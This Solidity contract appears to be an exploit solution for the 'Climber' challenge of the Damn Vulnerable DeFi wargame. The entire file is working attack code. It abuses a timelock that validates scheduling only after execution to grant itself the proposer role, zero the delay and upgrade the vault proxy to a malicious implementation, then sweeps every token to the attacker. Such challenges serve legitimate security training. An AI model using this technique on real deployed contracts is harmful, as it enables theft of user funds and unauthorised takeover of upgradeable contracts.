// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "../climber/ClimberTimelock.sol";
import "../climber/ClimberVault.sol";
import "../climber/SweepableVault.sol";
import "../DamnValuableToken.sol";

contract ClimberAttack {
    bytes32 public constant ADMIN_ROLE = keccak256("ADMIN_ROLE");
    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");

    bytes32 constant salt = bytes32("666");

    address[] targets;
    uint256[] values;
    bytes[] dataElements;

    ClimberTimelock timelock;
    ClimberVault vault;
    DamnValuableToken token;
    address payable attacker;

    constructor(
        ClimberTimelock _timelock,
        ClimberVault _vault,
        DamnValuableToken _token
    ) {
        timelock = _timelock;
        vault = _vault;
        token = _token;
        attacker = payable(msg.sender);
    }

    function attack() external {
        uint256 numTxs = 4;

        SweepableVault newVaultImplementation = new SweepableVault();

        targets = new address[](numTxs);
        values = new uint256[](numTxs);
        dataElements = new bytes[](numTxs);

        uint256 txId = 0;
        targets[txId] = address(timelock);
        values[txId] = 0;
        dataElements[txId] = abi.encodeWithSelector(
            timelock.grantRole.selector,
            PROPOSER_ROLE,
            address(this)
        );

        txId = 1;
        targets[txId] = address(timelock);
        values[txId] = 0;
        dataElements[txId] = abi.encodeWithSelector(
            timelock.updateDelay.selector,
            0
        );

        txId = 2;
        targets[txId] = address(this);
        values[txId] = 0;
        dataElements[txId] = abi.encodeWithSelector(
            ClimberAttack.schedule.selector
        );

        txId = 3;
        targets[txId] = address(vault);
        values[txId] = 0;
        dataElements[txId] = abi.encodeWithSelector(
            UUPSUpgradeable.upgradeTo.selector,
            address(newVaultImplementation)
        );

        timelock.execute(targets, values, dataElements, salt);

        SweepableVault sweepableVault = SweepableVault(address(vault));
        sweepableVault.setSweeper(address(this));
        sweepableVault.sweepFunds(address(token));
        token.transfer(attacker, token.balanceOf(address(this)));
    }

    function schedule() external {
        timelock.schedule(targets, values, dataElements, salt);
    }
}
